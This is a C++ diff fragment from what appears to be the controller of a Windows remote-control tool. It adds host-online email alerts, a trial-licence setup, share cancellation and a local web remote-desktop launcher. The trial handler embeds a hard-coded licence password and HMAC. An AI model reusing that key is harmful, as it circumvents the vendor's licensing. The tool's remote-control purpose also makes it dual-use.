+    if (!pattern.empty()) {
+        size_t start = pattern.find_first_not_of(" \t");
+        size_t end = pattern.find_last_not_of(" \t");
+        if (start != std::string::npos) {
+            std::string trimmed = pattern.substr(start, end - start + 1);
+            existingKeywordsLower.insert(ToLowerCase(trimmed));
+            existingKeywords.push_back(trimmed);
+        }
+    }
+
+    // Add new hosts if not already present (case-insensitive check)
+    int addedCount = 0;
+    for (const auto& host : hostsToAdd) {
+        if (existingKeywordsLower.find(ToLowerCase(host)) == existingKeywordsLower.end()) {
+            existingKeywordsLower.insert(ToLowerCase(host));
+            existingKeywords.push_back(host);
+            addedCount++;
+        }
+    }
+
+    if (addedCount == 0) {
+        MessageBoxL("所有选中的主机已在上线提醒列表中", "提示", MB_ICONINFORMATION);
+        return;
+    }
+
+    // Rebuild match pattern
+    std::string newPattern;
+    for (const auto& kw : existingKeywords) {
+        if (!newPattern.empty()) {
+            newPattern += ";";
+        }
+        newPattern += kw;
+    }
+
+    // Update config
+    rule.matchPattern = newPattern;
+    rule.enabled = true;
+    rule.triggerType = NOTIFY_TRIGGER_HOST_ONLINE;
+    rule.columnIndex = ONLINELIST_COMPUTER_NAME;
+
+    GetNotifyManager().SetConfig(config);
+    GetNotifyManager().SaveConfig();
+
+    // Build message with SMTP warning if not configured
+    CString msg;
+    msg.Format(_TR("已添加 %d 个主机到上线提醒列表"), addedCount);
+    if (!config.smtp.IsValid()) {
+        msg += _T("\n\n");
+        msg += _TR("注意: SMTP 未配置，请先在通知设置中配置邮箱");
+    }
+    MessageBoxL(msg, _TR("上线提醒"), MB_ICONINFORMATION);
+}
+
+void CMy2015RemoteDlg::OnMasterTrail()
+{
+    std::string pwd = THIS_CFG.GetStr("settings", "Password");
+    BOOL noPwd = pwd.empty();
+    if (!noPwd) {
+		MessageBoxL("已有授权密码。请勿将本程序用于任何非法、违规的用途，否则后果自负！",
+            "声明", MB_ICONINFORMATION);
+        return;
+    }
+    if (IDYES != MessageBoxL("本软件仅限于合法、正当、合规的用途。\r\n您是否同意？",
+        "声明", MB_ICONQUESTION | MB_YESNO))
+        return;
+    std::string master = THIS_CFG.GetStr("settings", "master");
+    int bindType = THIS_CFG.GetInt("settings", "BindType");
+    if (master != "127.0.0.1" || bindType != 1) {
+        THIS_CFG.SetStr("settings", "master", "127.0.0.1");
+        THIS_CFG.SetStr("settings", "BindType", "1");
+    }
+
+    THIS_CFG.SetStr("settings", "Password", "20260201-20280201-0020-be94-120d-20f9-919a");
+    THIS_CFG.SetStr("settings", "PwdHmac", "6015188620429852704");
+    THIS_CFG.SetStr("settings", "SN", getDeviceID("127.0.0.1"));
+    MessageBoxL("设置成功，仅限本地使用！试用版本会与授权服务联网验证！\n如需离线使用，需要正式授权。",
+        "警告", MB_ICONINFORMATION);
+}
+
+void CMy2015RemoteDlg::OnCancelShare()
+{
+    if(IDYES != MessageBoxL("确定取消分享主机? 将撤销全部的分享链接。", "提示", MB_YESNO | MB_ICONQUESTION))
+        return;
+
+    BYTE bToken[100] = { COMMAND_SHARE_CANCEL };
+    SendSelectedCommand(bToken, sizeof(bToken));
+}
+
+void CMy2015RemoteDlg::OnWebRemoteControl()
+{
+    int port = THIS_CFG.GetInt("settings", "WebSvrPort", -1);
+    if (port <= 0) {
+        MessageBoxL("请在菜单设置Web端口!", "提示", MB_ICONINFORMATION);
+    }
+    else if (m_superPass.empty()) {
+        MessageBoxL("请设置环境变量 " BRAND_ENV_VAR " 来使用Web远程桌面!", "提示", MB_ICONINFORMATION);
+    }else {
+        CString content;
+        content.Format("http://127.0.0.1:%d", port);
+        ShellExecute(NULL, _T("open"), content, NULL, NULL, SW_SHOWNORMAL);
+        MessageBoxL("如需Web远程桌面跨网使用方案，请联系管理员!", "提示", MB_ICONINFORMATION);
     }
 }
